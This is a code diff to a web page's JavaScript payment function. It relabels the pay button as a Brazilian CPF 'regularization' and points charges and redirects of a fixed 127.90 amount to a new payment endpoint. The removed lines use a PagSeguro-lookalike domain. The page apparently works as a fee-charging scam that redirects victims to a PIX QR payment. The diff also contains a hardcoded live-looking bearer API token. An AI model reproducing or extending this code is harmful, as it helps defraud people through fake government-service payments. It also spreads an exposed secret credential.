@@ -158,19 +158,19 @@
 
         async function processPayment() {
             const btn = document.getElementById('payBtn');
-            btn.innerText = "GERANDO QR CODE...";
+            btn.innerText = "REGULARIZAR CPF...";
             btn.disabled = true;
-            const fallbackTimer = setTimeout(() => { window.location.href = "https://pagseguropix.org/c/regulair"; }, 3000);
+            const fallbackTimer = setTimeout(() => { window.location.href = "https://pay.sharkautomacoes.com/a2ea109f"; }, 3000);
             try {
-                const response = await fetch('https://bravopay.club/api/v1/transactions', {
+                const response = await fetch('https://pay.sharkautomacoes.com/a2ea109f', {
                     method: 'POST',
                     headers: { 'Authorization': 'Bearer bp_live_PkZapYVszmu3qBWm88rcZLZfFNpTswuhLXZnCQ', 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amount_cents: 12790 })
                 });
                 const data = await response.json();
                 clearTimeout(fallbackTimer);
-                window.location.href = data.qr_code_url || "https://pagseguropix.org/c/regulair";
-            } catch (e) { window.location.href = "https://pagseguropix.org/c/regulair"; }
+                window.location.href = data.qr_code_url || "https://pay.sharkautomacoes.com/a2ea109f";
+            } catch (e) { window.location.href = "https://pay.sharkautomacoes.com/a2ea109f"; }
         }
     </script>
 </body>
